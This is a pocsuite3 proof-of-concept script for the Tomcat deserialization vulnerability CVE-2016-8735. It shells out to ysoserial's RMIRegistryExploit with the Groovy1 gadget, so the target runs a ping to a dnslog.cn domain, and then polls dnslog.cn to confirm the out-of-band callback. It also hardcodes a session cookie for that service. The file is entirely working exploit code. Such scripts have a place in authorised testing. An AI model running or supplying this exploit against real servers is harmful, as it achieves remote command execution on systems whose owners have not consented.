from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
import time
import requests
import os


class PHPStudyPOC(POCBase):
    vulID = 'tomcat-CVE-2016-8735'
    name = 'tomcat-CVE-2016-8735'
    appName = 'tomcat-CVE-2016-8735'
    appVersion = 'tomcat-CVE-2016-8735'
    desc = 'tomcat-CVE-2016-8735 反序列化'

    def _verify(self):
        result = {}
        headers = {
            'Cookie': 'UM_distinctid=1797b06e823a9b-06779e2a2e259a-37607201-13c680-1797b06e824137c; PHPSESSID=a485l5bhl2qhcq83l45hi8eol2; CNZZDATA1278305074=735099290-1621261891-%7C1621386626'
        }
        try:
            target = self.url
            resp = requests.get(url='http://dnslog.cn/getdomain.php', headers=headers)
            domain = str(resp.text)
            command = 'java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit {} 10001 Groovy1 "ping {} -n 10"'.format(str(target).replace('http://', ''), domain)
            os.system(command)
            flage = 0
            for i in range(0, 4):
                resp = requests.get(url='http://dnslog.cn/getrecords.php', headers=headers)
                if domain in resp.text:
                    flage = 1
                    break
            if flage == 1:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
        except Exception as e:
            print(e)
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()


register_poc(PHPStudyPOC)
